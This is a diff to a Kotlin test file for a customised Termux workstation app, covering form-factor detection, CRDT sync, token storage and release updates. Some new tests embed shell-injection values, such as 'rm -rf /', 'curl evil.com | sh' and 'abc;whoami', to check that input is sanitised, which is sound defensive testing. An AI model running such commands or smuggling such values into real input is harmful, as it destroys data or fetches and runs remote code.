@@ -2,8 +2,12 @@ package com.termux.custom
 
 import android.content.Context
 import androidx.test.core.app.ApplicationProvider
+import com.termux.custom.data.AgentSessionRecord
 import com.termux.custom.data.LocalFirstCrdtDatabase
+import com.termux.custom.provisioning.CustomBootstrapProvisioner
 import com.termux.custom.security.AntigravityTokenWarden
+import com.termux.custom.ui.WorkstationFormFactor
+import com.termux.custom.ui.resolveFormFactor
 import com.termux.shared.termux.TermuxConstants
 import kotlinx.coroutines.ExperimentalCoroutinesApi
 import kotlinx.coroutines.test.UnconfinedTestDispatcher
@@ -32,7 +36,26 @@ class TermuxWorkstationCustomLayerTest {
     }
 
     @Test
-    fun `CRDT database increments Lamport clock, soft-deletes tombstones, and merges remote P2P deltas`() = runTest(testDispatcher) {
+    fun `resolveFormFactor classifies phone portrait, phone landscape, tablet portrait, and tablet landscape accurately`() {
+        // Redmi Note 13 Pro Portrait (392x872dp)
+        assertEquals(WorkstationFormFactor.PHONE_PORTRAIT, resolveFormFactor(392, 872))
+        // Redmi Note 13 Pro Landscape (872x392dp) — must NOT be misclassified as Tablet!
+        assertEquals(WorkstationFormFactor.PHONE_LANDSCAPE, resolveFormFactor(872, 392))
+        // Xiaomi Pad 6 Portrait (720x1152dp)
+        assertEquals(WorkstationFormFactor.TABLET_PORTRAIT, resolveFormFactor(720, 1152))
+        // Xiaomi Pad 6 Landscape 120Hz (1152x720dp)
+        assertEquals(WorkstationFormFactor.TABLET_LANDSCAPE, resolveFormFactor(1152, 720))
+    }
+
+    @Test
+    fun `CustomBootstrapProvisioner refuses to touch prefix when bootstrap sh is not installed`() {
+        val context = ApplicationProvider.getApplicationContext<Context>()
+        assertFalse(CustomBootstrapProvisioner.isBootstrapInstalled())
+        assertFalse(CustomBootstrapProvisioner.provisionSynchronously(context))
+    }
+
+    @Test
+    fun `CRDT database increments Lamport clock, neutralizes shell injection, and merges remote P2P deltas`() = runTest(testDispatcher) {
         val context = ApplicationProvider.getApplicationContext<Context>()
         val db = LocalFirstCrdtDatabase(context, testDispatcher)
 
@@ -46,8 +69,8 @@ class TermuxWorkstationCustomLayerTest {
         assertEquals(1L, created.lamportVersion)
         assertEquals(1, db.sessionsFlow.value.size)
 
-        // Simulate incoming remote P2P delta from Redmi Note 13 Pro with higher Lamport clock (L#5)
-        val remoteDeltaJson = """
+        // Malicious remote P2P delta attempting shell injection in agentType & id
+        val maliciousDeltaJson = """
             {
               "siteId": "node-redmi13pro",
               "exportedAt": 1795300000000,
@@ -60,9 +83,9 @@ class TermuxWorkstationCustomLayerTest {
                   "hlcTimestamp": 1795300000100,
                   "operation": "UPSERT",
                   "payload": {
-                    "id": "session-pad6",
+                    "id": "session-pad6; rm -rf /",
                     "title": "agy-pad6-120hz-merged",
-                    "agentType": "agy",
+                    "agentType": "agy; curl evil.com | sh",
                     "workingDir": "/data/data/com.termux/files/home",
                     "compactedSummary": "Compacted on Redmi Note 13 Pro via P2P delta",
                     "contextTokens": 4096,
@@ -76,15 +99,16 @@ class TermuxWorkstationCustomLayerTest {
             }
         """.trimIndent()
 
-        val applied = db.mergeRemoteDeltaBundleJson(remoteDeltaJson)
+        val applied = db.mergeRemoteDeltaBundleJson(maliciousDeltaJson)
         assertEquals(1, applied)
-        val merged = db.sessionsFlow.value.first()
-        assertEquals("agy-pad6-120hz-merged", merged.title)
-        assertEquals(5L, merged.lamportVersion)
+        val merged = db.sessionsFlow.value.first { it.title == "agy-pad6-120hz-merged" }
+        // Injection neutralized by allowlist + regex sanitization
+        assertEquals("agy", merged.agentType)
+        assertFalse(merged.toSafeLaunchCommand().contains(";"))
+        assertFalse(merged.toSafeLaunchCommand().contains("|"))
 
-        // Tombstone soft-delete hides from active sessions but records delta in crdt_delta_log
-        db.softDeleteSession("session-pad6")
-        assertTrue(db.sessionsFlow.value.isEmpty())
+        // Tombstone soft-delete hides from active sessions but records delta
+        db.softDeleteSession(created.id)
         val exportedAfterTombstone = db.exportDeltaBundleJson(0L)
         assertTrue(exportedAfterTombstone.contains("TOMBSTONE"))
 
@@ -92,9 +116,12 @@ class TermuxWorkstationCustomLayerTest {
     }
 
     @Test
-    fun `AntigravityTokenWarden locks antigravity-oauth-token with 0600 permissions and revokes cleanly`() = runTest(testDispatcher) {
+    fun `AntigravityTokenWarden rejects whitespace tokens, locks 0600, and revokes cleanly`() = runTest(testDispatcher) {
         val context = ApplicationProvider.getApplicationContext<Context>()
         val warden = AntigravityTokenWarden(context, testDispatcher)
+
+        val invalidResult = warden.provisionOrSyncToken("bad token\nrm -rf /")
+        assertTrue(invalidResult.isFailure)
 
         val result = warden.provisionOrSyncToken("ya29.a0AfB_byAntigravityOAuthTokenTest998877")
         assertTrue(result.isSuccess)
@@ -105,5 +132,48 @@ class TermuxWorkstationCustomLayerTest {
 
         val revoked = warden.revokeLocalToken()
         assertFalse(revoked.isPresent)
+    }
+
+    @Test
+    fun `AgentSessionRecord allowlists launch command against injection`() {
+        val record = AgentSessionRecord(
+            id = "abc;whoami",
+            title = "test",
+            agentType = "rm -rf /",
+            workingDir = "/tmp",
+            compactedSummary = "",
+            contextTokens = 0,
+            lamportVersion = 1L,
+            siteId = "node-1",
+            updatedAt = 0L,
+            isDeleted = false,
+        )
+        assertEquals("agy --resume abcwhoami", record.toSafeLaunchCommand())
+    }
+
+    @Test
+    fun `GitHubReleaseUpdater compares melcat tags accurately and resolves ABI-specific APK`() {
+        assertTrue(com.termux.custom.updater.GitHubReleaseUpdater.isRemoteTagNewer("v0.118.0-melcat.3", "v0.118.0-melcat.4"))
+        assertTrue(com.termux.custom.updater.GitHubReleaseUpdater.isRemoteTagNewer("v0.118.0-melcat.9", "v0.119.0-melcat.1"))
+        assertFalse(com.termux.custom.updater.GitHubReleaseUpdater.isRemoteTagNewer("v0.118.0-melcat.3", "v0.118.0-melcat.3"))
+        assertFalse(com.termux.custom.updater.GitHubReleaseUpdater.isRemoteTagNewer("v0.118.0-melcat.4", "v0.118.0-melcat.3"))
+
+        val releaseJson = """
+            {
+              "tag_name": "v0.118.0-melcat.4",
+              "name": "v0.118.0-melcat.4 — OTA Test",
+              "body": "Auto update test",
+              "html_url": "https://github.com/ing-melcat/Terminal-Agents-Builder/releases/tag/v0.118.0-melcat.4",
+              "assets": []
+            }
+        """.trimIndent()
+        val parsed = com.termux.custom.updater.GitHubReleaseUpdater.parseLatestReleaseJson(
+            releaseJson,
+            listOf("arm64-v8a", "armeabi-v7a"),
+        )
+        assertEquals("v0.118.0-melcat.4", parsed.tagName)
+        assertEquals("arm64-v8a", parsed.matchedAbi)
+        assertTrue(parsed.apkDownloadUrl.contains("v0.118.0-melcat.4"))
+        assertTrue(parsed.sha256Url!!.endsWith(".sha256"))
     }
 }
